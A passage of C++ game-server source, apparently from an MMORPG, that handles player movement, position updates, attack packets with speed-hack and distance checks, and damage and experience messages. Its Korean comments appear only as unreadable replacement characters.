	ax = lpObj->PathX[0] = lpMove->X;
	ay = lpObj->PathY[0] = lpMove->Y;
	
	lpObj->PathDir[0] = lpObj->Dir;
	lpObj->PathStartEnd = 1;

	if( lpObj->PathCount > 0 ) 
	{
		lpObj->PathCur = 1; 
		lpObj->PathCount += 1;
	}

	for( n=1; n<lpObj->PathCount; n++)
	{
		if( n%2 == 1 )
			 pathtable = (lpMove->Path[(n+1)/2]>>4);
		else pathtable = (lpMove->Path[(n+1)/2]&0x0f);

		ax += RoadPathTable[pathtable*2];
		ay += RoadPathTable[(pathtable*2)+1];		

		lpObj->PathOri[n-1] = pathtable;
		lpObj->PathDir[n]   = (char)pathtable;
		lpObj->PathX[n]     = ax;
		lpObj->PathY[n]     = ay;
	}
	
#ifdef MODIFY_FORCEMOVE_TO_LORENCIA_20060515
	// ���� �� ���� ������ �����̶��, ��� �̵��� ����� �Ѵ�.
	if ( lpObj->PathCount > 0 )
	{
		int nextX = lpObj->PathX[1];
		int nextY = lpObj->PathY[1];

		BYTE mapnumber;
		mapnumber	= lpObj->MapNumber;
		if ( mapnumber > g_TerrainManager.Size() - 1 )
		{
			// ��ū ����
		}
		BYTE attr =  MapC[mapnumber].GetAttr(nextX, nextY);
		if( (attr&MAP_ATTR_BLOCK) == MAP_ATTR_BLOCK || 
			(attr&MAP_ATTR_HOLLOW) == MAP_ATTR_HOLLOW
			)	
		{
			// ��� �ʱ�ȭ ����� �Ѵ�.
			for( n=0; n<MAX_ROADPATH; n++)
			{
				lpObj->PathX[n] = 0;
				lpObj->PathY[n] = 0;
				lpObj->PathOri[n] = 0;
			}
			lpObj->PathCount = 0;
			lpObj->PathCur = 0;
			lpObj->PathStartEnd = 0;
			// 0524 �߰� ����
			gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);
			return;
		}
	}
#endif //MODIFY_FORCEMOVE_TO_LORENCIA_20060515
	
	lpObj->TX     = (BYTE)ax;
	lpObj->TY     = (BYTE)ay;


#ifdef CASTLE_NPC_GATE_WORK_20041206		// �� �Ӽ��� Ŭ���̾�Ʈ�� ���������� üũ�Ͽ� ����
	
//#if TESTSERVER != 1						// �ӽ� !!! -> �׽�Ʈ �������� Ŭ���̾�Ʈ �̵��׽�Ʈ �� ���� Ǯ��� ��
	// ��� �Ӽ��� Ŭ���̾�Ʈ�� ���Ƿ� ������ �� ����.
	if (lpObj->Type == OBJTYPE_CHARACTER) {
		INT iCX			= lpObj->X;
		INT iCY			= lpObj->Y;
		BOOL bSetStand	= FALSE;
		WORD wMapAttr	= 0;

		for (INT iCOUNT = 0 ; iCOUNT < MAX_TERRAIN_SIZE ; iCOUNT++) {
			if (iCX > lpObj->TX)	iCX -= 1;
			if (iCX < lpObj->TX)	iCX += 1;
			if (iCY > lpObj->TY)	iCY -= 1;
			if (iCY < lpObj->TY)	iCY += 1;

			// ���� ĭ���� ����Ѵ�.
			wMapAttr		= MapC[lpObj->MapNumber].GetAttr(iCX, iCY);
			if ((wMapAttr&MAP_ATTR_WATER) == MAP_ATTR_WATER) {			// ���Ӽ� (������ �� ������ üũ)
				bSetStand	= TRUE;
				break;
			}

			if ((iCX == lpObj->TX) && (iCY == lpObj->TY)) {
				break;
			}
		}

		if (bSetStand == TRUE) {
			lpObj->m_Rest = 1;
			lpObj->PathCur = 0;
			lpObj->PathCount = 0;
			lpObj->PathStartEnd = 0;
			gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);									// ���������� ��ġ�� �������� �ְ�
			
			PMSG_ACTIONRESULT	pActionResult;
			PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof( pActionResult ));
			pActionResult.NumberH		= HIBYTE(aIndex);
			pActionResult.NumberL		= LOBYTE(aIndex);
			pActionResult.ActionNumber	= AT_STAND1;
			pActionResult.Dir = lpObj->Dir;
#ifdef ADD_TRAP_OBJECT_EXTEND_20060731
			pActionResult.TargetNumberH = 0;
			pActionResult.TargetNumberL = 0;
#endif
			DataSend(lpObj->m_Index, (unsigned char*) &pActionResult, sizeof(PMSG_ACTIONRESULT));	// �ڽ��� �������� �˸���.
			return;
		}
	}
//#endif //##TESTSERVER != 1

#endif //##CASTLE_NPC_GATE_WORK_20041206

	
#ifdef FOR_BLOODCASTLE
	// �̵��Ϸ��� ��ġ�� ���ؼ� üũ�Ѵ�. (����ĳ���� ���ؼ�)
	if (CHECK_BLOODCASTLE(lpObj->MapNumber) && (lpObj->Type == OBJTYPE_CHARACTER)) {
#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// ����ĳ�� �ٸ� �ε��� ����
		int iBridgeIndex = g_BloodCastle.GetBridgeIndexByMapNum( lpObj->MapNumber );
		switch(g_BloodCastle.GetCurrentState( iBridgeIndex )) {
#else
		switch(g_BloodCastle.GetCurrentState(lpObj->MapNumber - MAP_INDEX_BLOODCASTLE1)) {
#endif
		case BLOODCASTLE_STATE_CLOSED:
			{
				if (lpObj->TY > 15) {
					lpObj->m_Rest = 1;
					lpObj->PathCur = 0;
					lpObj->PathCount = 0;
					lpObj->PathStartEnd = 0;
					gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);									// ���������� ��ġ�� �������� �ְ�
					
					PMSG_ACTIONRESULT	pActionResult;
					PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof( pActionResult ));
					pActionResult.NumberH		= HIBYTE(aIndex);
					pActionResult.NumberL		= LOBYTE(aIndex);
					pActionResult.ActionNumber	= AT_STAND1;
					pActionResult.Dir = lpObj->Dir;
#ifdef ADD_TRAP_OBJECT_EXTEND_20060731
					pActionResult.TargetNumberH = 0;
					pActionResult.TargetNumberL = 0;
#endif
					DataSend(lpObj->m_Index, (unsigned char*) &pActionResult, sizeof(PMSG_ACTIONRESULT));	// �ڽ��� �������� �˸���.
//					gObjMoveGate(lpObj->m_Index, 66 + lpObj->MapNumber - MAP_INDEX_BLOODCASTLE1);
					return;
				}
			}
			break;
		case BLOODCASTLE_STATE_PLAYING:
			{
#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// ����ĳ�� �ٸ� �ε��� ����
				if ((lpObj->Y > 17) && (!g_BloodCastle.CheckPlayStart( iBridgeIndex ))) {
					gObjMoveGate (lpObj->m_Index, 66 + iBridgeIndex );
#else
				if ((lpObj->Y > 17) && (!g_BloodCastle.CheckPlayStart(lpObj->MapNumber - MAP_INDEX_BLOODCASTLE1))) {
					gObjMoveGate (lpObj->m_Index, 66 + lpObj->MapNumber - MAP_INDEX_BLOODCASTLE1);
#endif
					return;
				}

#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// ����ĳ�� �ٸ� �ε��� ����
				if ((lpObj->TY > 15) && (!g_BloodCastle.CheckPlayStart( iBridgeIndex ))) {
#else
				if ((lpObj->TY > 15) && (!g_BloodCastle.CheckPlayStart(lpObj->MapNumber - MAP_INDEX_BLOODCASTLE1))) {
#endif
					lpObj->m_Rest = 1;
					lpObj->PathCur = 0;
					lpObj->PathCount = 0;
					lpObj->PathStartEnd = 0;
					gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);									// ���������� ��ġ�� �������� �ְ�
					
					PMSG_ACTIONRESULT	pActionResult;
					PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof( pActionResult ));
					pActionResult.NumberH		= HIBYTE(aIndex);
					pActionResult.NumberL		= LOBYTE(aIndex);
					pActionResult.ActionNumber	= AT_STAND1;
					pActionResult.Dir = lpObj->Dir;
#ifdef ADD_TRAP_OBJECT_EXTEND_20060731
					pActionResult.TargetNumberH = 0;
					pActionResult.TargetNumberL = 0;
#endif
					DataSend(lpObj->m_Index, (unsigned char*) &pActionResult, sizeof(PMSG_ACTIONRESULT));	// �ڽ��� �������� �˸���.
//					gObjMoveGate(lpObj->m_Index, 66 + lpObj->MapNumber - MAP_INDEX_BLOODCASTLE1);
					return;
				}

#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// ����ĳ�� �ٸ� �ε��� ����
				if ((lpObj->TY > 76) && (g_BloodCastle.m_BridgeData[iBridgeIndex].m_bCASTLE_DOOR_LIVE)) {
#else
				if ((lpObj->TY > 76) && (g_BloodCastle.m_BridgeData[lpObj->MapNumber - MAP_INDEX_BLOODCASTLE1].m_bCASTLE_DOOR_LIVE)) {
#endif
					lpObj->m_Rest = 1;
					lpObj->PathCur = 0;
					lpObj->PathCount = 0;
					lpObj->PathStartEnd = 0;
					gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);									// ���������� ��ġ�� �������� �ְ�
					
					PMSG_ACTIONRESULT	pActionResult;
					PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof( pActionResult ));
					pActionResult.NumberH		= HIBYTE(aIndex);
					pActionResult.NumberL		= LOBYTE(aIndex);
					pActionResult.ActionNumber	= AT_STAND1;
					pActionResult.Dir = lpObj->Dir;
#ifdef ADD_TRAP_OBJECT_EXTEND_20060731
					pActionResult.TargetNumberH = 0;
					pActionResult.TargetNumberL = 0;
#endif
					DataSend(lpObj->m_Index, (unsigned char*) &pActionResult, sizeof(PMSG_ACTIONRESULT));	// �ڽ��� �������� �˸���.
//					gObjMoveGate(lpObj->m_Index, 66 + lpObj->MapNumber - MAP_INDEX_BLOODCASTLE1);
					return;
				}
			}
			break;
		default:
			break;
		}
	}
#endif


#ifdef PACKET_CHANGE	
	PHeadSetB((LPBYTE)&pMove, PACKET_MOVE, sizeof( pMove ));
#else
	PHeadSetB((LPBYTE)&pMove, 0x10, sizeof( pMove ));
#endif

	pMove.NumberH		= HIBYTE(aIndex);
	pMove.NumberL		= LOBYTE(aIndex);
	pMove.X				= (BYTE)ax;
	pMove.Y				= (BYTE)ay;
	pMove.Path          = lpObj->Dir<<4;
	
	if( lpObj->Type == OBJTYPE_CHARACTER )
	{
		if( lpObj->m_IfState.use ) 
		{
			if( lpObj->m_IfState.type == I_SHOP )	// ���� �ŷ����̾��ٸ�..
			{
				lpObj->TargetShopNumber = -1;	// �����ŷ��� ����Ѵ�.
				lpObj->m_IfState.type   = 0;
				lpObj->m_IfState.use    = 0;
			}
		}

		if( gObjPositionCheck(lpObj) == FALSE ) 
		{
			lpObj->PathCur  = 0; 
			lpObj->PathCount= 0;
#ifdef MODIFY_MOVE_MAP_MOON_WALKING_BUGFIX_20090908
			// �� �̵��� gObjPositionCheck()�� ������ FALSE�̴�.
			// ���� �Ʒ��� Anti_HACK ó���� �����Ѵ�.
#else // MODIFY_MOVE_MAP_MOON_WALKING_BUGFIX_20090908
#ifdef ADD_ANTI_HACK_01_20051027
			lpObj->m_Rest				= 1;
			lpObj->PathStartEnd			= 0;
			gObjSetPosition(lpObj->m_Index, lpObj->X, lpObj->Y);									// ���������� ��ġ�� �������� �ְ�
			
			PMSG_ACTIONRESULT	pActionResult;
			PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof( pActionResult ));

			pActionResult.NumberH		= HIBYTE(aIndex);
			pActionResult.NumberL		= LOBYTE(aIndex);
			pActionResult.ActionNumber	= AT_STAND1;
			pActionResult.Dir			= lpObj->Dir;
#ifdef ADD_TRAP_OBJECT_EXTEND_20060731
			pActionResult.TargetNumberH = 0;
			pActionResult.TargetNumberL = 0;
#endif

			DataSend(lpObj->m_Index, (unsigned char*) &pActionResult, sizeof(PMSG_ACTIONRESULT));	// �ڽ��� �������� �˸���.

			LogAddTD("[Anti-HACK][PMoveProc][Check Position Error] :(%s)(%s) S(%d,%d) -> T(%d,%d)", 
				lpObj->AccountID, lpObj->Name,  lpObj->X, lpObj->Y, ax, ay);
			
			return;
#endif
#endif // MODIFY_MOVE_MAP_MOON_WALKING_BUGFIX_20090908
			
			ax				= lpObj->X;
			ay				= lpObj->Y;
			lpObj->TX		= (BYTE)ax;
			lpObj->TY		= (BYTE)ay;			
			pMove.X			= (BYTE)ax;
			pMove.Y	  		= (BYTE)ay;
		}
		DataSend(aIndex, (LPBYTE)&pMove, pMove.h.size);
	}

	int MVL = MAXVIEWPORTOBJECT;
	if( lpObj->Type == OBJTYPE_MONSTER ) MVL = MAX_MONVIEWPORTOBJECT;

	// ���� ���� �ִ� �����鿡�� ���� �ൿ�� �����ش�.
	for( n=0; n<MVL; n++ )
	{
		if( lpObj->VpPlayer2[n].state == STVP_CREATE )
		{
			int number = lpObj->VpPlayer2[n].number;
			if( number >= 0 )
			{
				if( (gObj[number].Connected > 1) && (gObj[number].Live) )	// ������� ������ �ִٸ�..
				{
					if( gObj[number].Type == OBJTYPE_CHARACTER)
						DataSend(lpObj->VpPlayer2[n].number, (LPBYTE)&pMove, pMove.h.size);
				}
				else 
				{
					lpObj->VpPlayer2[n].number = -1;
					lpObj->VpPlayer2[n].state  = STVP_NONE;
					lpObj->VPCount2--;
				}
			}
		}	
	}
	
	//---
	MapC[lpObj->MapNumber].ClearStandAttr(lpObj->m_OldX, lpObj->m_OldY);
	MapC[lpObj->MapNumber].SetStandAttr(lpObj->TX, lpObj->TY);
	lpObj->m_OldX = lpObj->TX;
	lpObj->m_OldY = lpObj->TY;
	lpObj->X  = sx;
	lpObj->Y  = sy;
	lpObj->m_ViewState = 0;
}

//----------------------------------------------------------------------------
// ������ ��ġ ����
//----------------------------------------------------------------------------
void RecvPositionSetProc(LPPMSG_POSISTION_SET lpMove, int aIndex)
{
	short n;


	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) )
	{
		LogAdd("error : move protocol index error %s %d",__FILE__, __LINE__);
		return;
	}
	LPOBJECTSTRUCT	lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];

	if( PacketCheckTime(lpObj) == FALSE ) return;
	
	if( lpObj->Teleport ) return;
	// ���� ��ġ ����
	lpObj->X = lpMove->X;
	lpObj->Y = lpMove->Y;	
	
#ifdef CHAOSCASTLE_SYSTEM_20040408		// ī���� ĳ������ ������ ���߷� �и� �� 1�ʰ� �������ٸ� ����ġ�� ������ ������ ���� �ʴ´�.
	if (CHECK_CHAOSCASTLE(lpObj->MapNumber)) {
		if( GetTickCount() - lpObj->m_iChaosCastleBlowTime < 1000 ) {
			return;
		}
	}
#endif

#ifdef ADD_LOG_CHECK_INVLIDE_X_Y_POSITION_20060131
	if( gObjCheckXYMapTile(lpObj, DBGNAME_RecvPositionSetProc ) == TRUE ) 
		return;
#else
	if( gObjCheckXYMapTile(lpObj) == TRUE ) return;
#endif // ADD_LOG_CHECK_INVLIDE_X_Y_POSITION_20060131

	PMSG_RECV_POSISTION_SET pMove;

#ifdef PACKET_CHANGE	
	PHeadSetB((LPBYTE)&pMove, PACKET_POSITION, sizeof( pMove));
#else
	PHeadSetB((LPBYTE)&pMove, 0x11, sizeof( pMove));
#endif

	pMove.NumberH		= HIBYTE(aIndex);
	pMove.NumberL		= LOBYTE(aIndex);
	pMove.X				= (BYTE)lpMove->X;
	pMove.Y				= (BYTE)lpMove->Y;
		
	lpObj->TX     = (BYTE)lpMove->X;
	lpObj->TY     = (BYTE)lpMove->Y;

	if( gObjPositionCheck(lpObj) == FALSE ) 
	{
		
#ifdef ADD_ANTI_HACK_01_20051027
	// Ŭ���̾�Ʈ���� ��ġ ����.. ���⼭ üũ 0xdc
	LogAddTD("[Anti-Hack][RecvPositionSetProc][Check Position Error] :(%s)(%s) S(%d,%d) -> T(%d,%d)", 
				lpObj->AccountID, lpObj->Name,  lpObj->X, lpObj->Y, lpObj->TX, lpObj->TY);
#endif
	
		return;
	}

	CreateFrustrum(lpObj->X,lpObj->Y, aIndex);

	if( lpObj->Type == OBJTYPE_CHARACTER )
		DataSend(aIndex, (LPBYTE)&pMove, pMove.h.size);

	int MVL = MAXVIEWPORTOBJECT;
	if( lpObj->Type == OBJTYPE_MONSTER ) MVL = MAX_MONVIEWPORTOBJECT;

	// ���� ���� �ִ� �����鿡�� ���� �ൿ�� �����ش�.
	for( n=0; n<MVL; n++ )
	{
		if( lpObj->VpPlayer2[n].type == OBJTYPE_CHARACTER)
		{
			if( lpObj->VpPlayer2[n].state == STVP_CREATE )
			{
				int number = lpObj->VpPlayer2[n].number;
				if( (gObj[number].Connected > 1) && (gObj[number].Live) )	// ������� ������ �ִٸ�..
					DataSend(lpObj->VpPlayer2[n].number, (LPBYTE)&pMove, pMove.h.size);
				else 
				{
					lpObj->VpPlayer2[n].number = -1;
					lpObj->VpPlayer2[n].state  = STVP_NONE;
					lpObj->VPCount2--;
				}
				
			}
		}
	}
	//---
	MapC[lpObj->MapNumber].ClearStandAttr(lpObj->m_OldX, lpObj->m_OldY);
	MapC[lpObj->MapNumber].SetStandAttr(lpObj->TX, lpObj->TY);
	lpObj->m_OldX = lpObj->TX;
	lpObj->m_OldY = lpObj->TY;
}



//----------------------------------------------------------------------------
// [PACKET_ATTACK] ĳ���Ͱ� ������ �ߴ�.
void CGAttack(LPPMSG_ATTACK lpMsg, int aIndex)
{
	LPOBJECTSTRUCT lpObj, lpTargetObj;
	//BYTE Dis;

	int usernumber;
	usernumber = MAKEWORD(lpMsg->NumberL,lpMsg->NumberH);

	if(usernumber< 0 || (usernumber > (MAX_OBJECT-1))) 
	{
		LogAdd("[CGAttack] [UserIndex Error] :%s %d %d", __FILE__, __LINE__, usernumber);
		return;
	}

	if( !gObj[usernumber].Live ) 
	{	// �׾��ִ� �������
		return;
	}
	
	lpObj = &gObj[aIndex];

#ifdef ADD_ANTI_HACK_01_20051027
	// ��Ŷ �ð� ó��
	DWORD dwCurruntTime = GetTickCount();
	if(  dwCurruntTime - lpObj->m_dwLastPacketAttackTime < 200 ) 
	{
		LogAddTD("[Anti-Hack][CGATTACK][PacketTime Error] :(%s)(%s) T:%d", lpObj->AccountID, lpObj->Name, dwCurruntTime - lpObj->m_dwLastPacketAttackTime );
		return;
	}
	else
	{
		lpObj->m_dwLastPacketAttackTime = dwCurruntTime;
	}

	// ���� �Ÿ� üũ! 3 �̻� �϶� ����!
	INT	iDistance = gObjCalDistance(&gObj[aIndex], &gObj[usernumber]);
	if( iDistance > 3 )
	{
		LogAddTD("[Anti-Hack][CGATTACK][Distance Error] :(%s)(%s) D:%d", lpObj->AccountID, lpObj->Name, iDistance );
		return;
	}
#endif

	int iTimeCalc = GetTickCount()-lpObj->m_LastAttackTime;

/*	K2 ���� ���� �� ����.
#ifdef FOR_CHINA
	if( iTimeCalc < lpObj->m_DetectSpeedHackTime )
#else
	#ifdef FOR_THAILAND		
		if( iTimeCalc < lpObj->m_DetectSpeedHackTime ) 	
	#else
		if( iTimeCalc < lpObj->m_DetectSpeedHackTime && iTimeCalc != 0 && lpObj->HaveWeaponInHand ) 
	#endif
#endif
*/
	if( iTimeCalc < lpObj->m_DetectSpeedHackTime )
	{	// �Ϲ� ������ �տ� ���⸦ ��� �������� üũ �Ѵ�
		lpObj->m_DetectCount++;

		lpObj->m_SumLastAttackTime += iTimeCalc;

		if( lpObj->m_DetectCount > gHackCheckCount )
		{
			lpObj->m_DetectedHackKickCount++;
			lpObj->m_SpeedHackPenalty = gSpeedHackPenalty;

			if( gIsKickDetecHackCountLimit ) 
			{
				if( lpObj->m_DetectedHackKickCount > gDetectedHackKickCount )
				{
#ifdef MODIFY_HACKLOG_OF_ATTACK_20050518
	#ifdef CHINA_HACKUSER_KICK_SYSTEM
					ChinaHackLogFile.Output("[%s][%s] %s Kick DetecHackCountLimit Over User (%d) @%d",
									 lpObj->AccountID, 
									 lpObj->Name, 
									 lMsg.Get(1900+lpObj->Class),
									 lpObj->m_DetectedHackKickCount,
									 lpObj->MapNumber);
	#else
					LogAddTD("[%s][%s] %s Kick DetecHackCountLimit Over User (%d) @%d",
							 lpObj->AccountID, 
							 lpObj->Name, 
							 lMsg.Get(1900+lpObj->Class),
							 lpObj->m_DetectedHackKickCount,
							 lpObj->MapNumber);
	#endif
#else
	#ifdef CHINA_HACKUSER_KICK_SYSTEM
					ChinaHackLogFile.Output("[%s][%s] %s Kick DetecHackCountLimit Over User (%d)",
									 lpObj->AccountID, 
									 lpObj->Name, 
									 lMsg.Get(1900+lpObj->Class),
									 lpObj->m_DetectedHackKickCount);
	#else
					LogAddTD("[%s][%s] %s Kick DetecHackCountLimit Over User (%d)",
							 lpObj->AccountID, 
							 lpObj->Name, 
							 lMsg.Get(1900+lpObj->Class),
							 lpObj->m_DetectedHackKickCount);
	#endif
#endif

					CloseClient(aIndex);
					return;
				}
			}
			
#ifdef MODIFY_HACKLOG_OF_ATTACK_20050518
	#ifdef CHINA_HACKUSER_KICK_SYSTEM
			ChinaHackLogFile.Output("[%s][%s] %s Attack Speed Is Wrong Normal (%d)(%d) Penalty %d @%d", 
									 lpObj->AccountID, 
									 lpObj->Name, 
									 lMsg.Get(1900+lpObj->Class),
									 lpObj->m_DetectSpeedHackTime,
									 lpObj->m_SumLastAttackTime/lpObj->m_DetectCount,
									 lpObj->m_SpeedHackPenalty,
									 lpObj->MapNumber);
			ChinaHackUserKick.InsertSpeedNCount(lpObj->m_Index);
	#else
			LogAddTD("[%s][%s] %s Attack Speed Is Wrong Normal (%d)(%d) Penalty %d @%d", 
						 lpObj->AccountID, 
						 lpObj->Name, 
						 lMsg.Get(1900+lpObj->Class),
						 lpObj->m_DetectSpeedHackTime,
						 lpObj->m_SumLastAttackTime/lpObj->m_DetectCount,
						 lpObj->m_SpeedHackPenalty,
						 lpObj->MapNumber);
	#endif
#else
	#ifdef CHINA_HACKUSER_KICK_SYSTEM
			ChinaHackLogFile.Output("[%s][%s] %s Attack Speed Is Wrong Normal (%d)(%d) Penalty %d", 
									 lpObj->AccountID, 
									 lpObj->Name, 
									 lMsg.Get(1900+lpObj->Class),
									 lpObj->m_DetectSpeedHackTime,
									 lpObj->m_SumLastAttackTime/lpObj->m_DetectCount,
									 lpObj->m_SpeedHackPenalty);
			ChinaHackUserKick.InsertSpeedNCount(lpObj->m_Index);
	#else
			LogAddTD("[%s][%s] %s Attack Speed Is Wrong Normal (%d)(%d) Penalty %d", 
						 lpObj->AccountID, 
						 lpObj->Name, 
						 lMsg.Get(1900+lpObj->Class),
						 lpObj->m_DetectSpeedHackTime,
						 lpObj->m_SumLastAttackTime/lpObj->m_DetectCount,
						 lpObj->m_SpeedHackPenalty);
	#endif
#endif			
			//if( bIsIgnorePacketSpeedHackDetect )
			//	return;
		}
		lpObj->m_LastAttackTime = GetTickCount();		
	}
	else
	{
		lpObj->m_SumLastAttackTime = 0;
		lpObj->m_DetectCount = 0;
	}	
	lpObj->m_LastAttackTime = GetTickCount();	


	if( bIsIgnorePacketSpeedHackDetect )
	{
		if( lpObj->m_SpeedHackPenalty > 0 )
		{
			lpObj->m_SpeedHackPenalty--;

#ifdef MODIFY_HACKLOG_OF_ATTACK_20050518
			LogAddTD("[%s][%s] %s Apply Attack Speed Penalty (%d left) @%d", 
					  lpObj->AccountID, lpObj->Name, lMsg.Get(1900+lpObj->Class),
					  lpObj->m_SpeedHackPenalty,
					  lpObj->MapNumber);
#else
			LogAddTD("[%s][%s] %s Apply Attack Speed Penalty (%d left)", 
					  lpObj->AccountID, lpObj->Name, lMsg.Get(1900+lpObj->Class),
					  lpObj->m_SpeedHackPenalty);
#endif
			return;
		}
	}

	//LogAdd("Normal Attack Speed = [%d,%d] %d", lpObj->m_AttackSpeed, lpObj->m_MagicSpeed, iTimeCalc);

	lpTargetObj = &gObj[usernumber];
	lpObj->Dir  = lpMsg->DirDis;
	
#ifdef ADD_TRAP_OBJECT_EXTEND_20060731
	// �� �κ��� Ʈ���� �����ϴ� �κ�
	GCActionSend(lpObj, lpMsg->AttackAction, aIndex, usernumber);
#else
	GCActionSend(lpObj, lpMsg->AttackAction, aIndex);
#endif // ADD_TRAP_OBJECT_EXTEND_20060731
	
#ifdef ADD_SKILL_WITH_COMBO
	gComboAttack.CheckCombo(aIndex, 0);
#endif

	gObjAttack(lpObj, lpTargetObj, NULL, 0, 0);

	lpObj->UseMagicNumber = 0;
}

// [PACKET_ATTACK] ������ ������ ���� �������� ������ �ڿ� ���� �����ڿ��� ������.
#ifdef ADD_SHIELD_POINT_01_20060403
void GCDamageSend(int aIndex, int TargetIndex, int AttackDamage, int MSBFlag, int MSBDamage, int iShieldDamage)
#else
void GCDamageSend(int aIndex, int TargetIndex, int AttackDamage, int MSBFlag, int MSBDamage)
#endif
{
	PMSG_ATTACKRESULT pResult;

	// [0x15] ������ ����/���� �������� ����� �˸���.
#ifdef PACKET_CHANGE	
	PHeadSetB((LPBYTE)&pResult, PACKET_ATTACK, sizeof( pResult ));
#else
	PHeadSetB((LPBYTE)&pResult, 0x15, sizeof( pResult ));
#endif
	
	pResult.NumberH = HIBYTE(TargetIndex);
	pResult.NumberL = LOBYTE(TargetIndex);
	pResult.DamageH = HIBYTE(AttackDamage);
	pResult.DamageL = LOBYTE(AttackDamage);

#ifdef ADD_SHIELD_POINT_01_20060403
	pResult.btShieldDamageH = HIBYTE(iShieldDamage);
	pResult.btShieldDamageL = LOBYTE(iShieldDamage);
#endif

	if( MSBFlag )
	{
		pResult.NumberH &= 0x7F;
		pResult.NumberH |= 0x80;
		//pResult.NumberH |= MSBFlag;		
	}

#ifdef ADD_SKILL_WITH_COMBO
	pResult.DamageType = MSBDamage; 
#else
	if( MSBDamage )
	{	

		pResult.DamageH &= 0x1F;
		pResult.DamageH |= MSBDamage;

	}
#endif
	
	if( gObj[TargetIndex].Type == OBJTYPE_CHARACTER )
		DataSend(TargetIndex, (LPBYTE)&pResult, pResult.h.size);

	if( cManager.WatchTargetIndex == TargetIndex || cManager.WatchTargetIndex == aIndex )
	{	// ������ ���ø� ������ ������ ���ο��Ե� ������ ������
		cManager.DataSend((LPBYTE)&pResult, pResult.h.size);
	}
	
	if( gObj[aIndex].Type == OBJTYPE_CHARACTER )
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

#ifdef TEST_MSG_MLS_ACTIVE_20080131
#if TESTSERVER == 1
	PMSG_NOTICE	pNotice;
	CHAR szNotice[256] = {0,};
	
	TNotice::SetNoticeProperty( &pNotice, TNOTICE_TYPE_LEFTTOP, TNOTICE_COLOR_RED );
	wsprintf( szNotice, "[%s]->[%s] : %d(SD:%d)", gObj[aIndex].Name, gObj[TargetIndex].Name, AttackDamage, iShieldDamage );
	TNotice::MakeNoticeMsg( &pNotice, TNOTICE_TYPE_LEFTTOP, szNotice );
	TNotice::SendNoticeToUser( aIndex, &pNotice );
	TNotice::SendNoticeToUser( TargetIndex, &pNotice );
#endif
#endif
}


// [0xF3][0x07] ������ ���� ������.
#ifdef ADD_SHIELD_POINT_01_20060403
void GCDamageSend(int aIndex, int damage, int iShieldDamage)
#else
void GCDamageSend(int aIndex, int damage)
#endif
{
	if( gObj[aIndex].Type != OBJTYPE_CHARACTER ) return;

	PMSG_DAMAGE	pDamage;
	
	PHeadSubSetB((LPBYTE)&pDamage, 0xF3, 0x07, sizeof(pDamage));

	pDamage.DamageH		= HIBYTE( damage );
	pDamage.DamageL		= LOBYTE( damage );
#ifdef ADD_SHIELD_POINT_01_20060403
	pDamage.btShieldDamageH = HIBYTE( iShieldDamage );
	pDamage.btShieldDamageL = LOBYTE( iShieldDamage );
#endif
	
	DataSend(aIndex, (LPBYTE)&pDamage, pDamage.h.size);

#ifdef TEST_MSG_MLS_ACTIVE_20080131
#if TESTSERVER == 1
	PMSG_NOTICE	pNotice;
	CHAR szNotice[256] = {0,};
	
//	TNotice::SetNoticeProperty( &pNotice, TNOTICE_PRIORITY_LV1, TNOTICE_COLOR_RED );
	wsprintf( szNotice, "->[%s] : %d(SD:%d)", gObj[aIndex].Name, damage, iShieldDamage );
	TNotice::MakeNoticeMsg( &pNotice, TNOTICE_PRIORITY_LV1, szNotice);
	TNotice::SendNoticeToUser( aIndex, &pNotice );	
#endif
#endif
}


// [0x16] �������� ���ݿ� ������ ���ߴٸ� (������ ���� �������� ����ġ�� ������)
void GCKillPlayerExpSend(int aIndex, int TargetIndex, int exp, int AttackDamage, int MSBFlag)
{
	PMSG_KILLPLAYER	pkillMsg;
	
	PHeadSetBE((LPBYTE)&pkillMsg, 0x16, sizeof( pkillMsg));

	pkillMsg.NumberH	= HIBYTE( TargetIndex );
	pkillMsg.NumberL	= LOBYTE( TargetIndex );
	pkillMsg.ExpH		= HIBYTE( exp ) ;
	pkillMsg.ExpL		= LOBYTE( exp ) ;
	pkillMsg.DamageH    = HIBYTE( AttackDamage );
	pkillMsg.DamageL    = LOBYTE( AttackDamage );
	
	if( MSBFlag )
	{
		pkillMsg.NumberH &= 0x7F;
		pkillMsg.NumberH |= 0x80;
	}
#ifdef FOR_BLOODCASTLE
	// ���� ĳ������ ����� �߾��ٸ� ����ġ�� �����Ѵ�.
	if (CHECK_BLOODCASTLE(gObj[aIndex].MapNumber)) {
		g_BloodCastle.AddExperience(aIndex, exp);
	}
#endif

	// ������ �������� ����ġ�� �ش�.
	DataSend(aIndex, (LPBYTE)&pkillMsg, pkillMsg.h.size);

#ifdef TEST_MSG_MLS_ACTIVE_20080131
#if TESTSERVER == 1
	PMSG_NOTICE	pNotice;
	CHAR szNotice[256] = {0,};
	
//	TNotice::SetNoticeProperty( &pNotice, TNOTICE_PRIORITY_LV1, TNOTICE_COLOR_RED );
	wsprintf( szNotice, "[%s]->[%s] : %d (Kill)", gObj[aIndex].Name, gObj[TargetIndex].Name, AttackDamage );
	TNotice::MakeNoticeMsg( &pNotice, TNOTICE_PRIORITY_LV1, szNotice);
	TNotice::SendNoticeToUser( aIndex, &pNotice );
	TNotice::SendNoticeToUser( TargetIndex, &pNotice );
#endif
#endif
}

#ifdef BUGFIX_GAIN_EXP_20071210	// void GCSendExp_INT64
// [0x9C] ����ġ�� ���� �� INT64�� ����� ��� �� �Լ��� ����Ѵ�.
void GCSendExp_INT64( int aindex, int TargetIndex, INT64 exp, int AttackDamage, int MSBFlag )
{
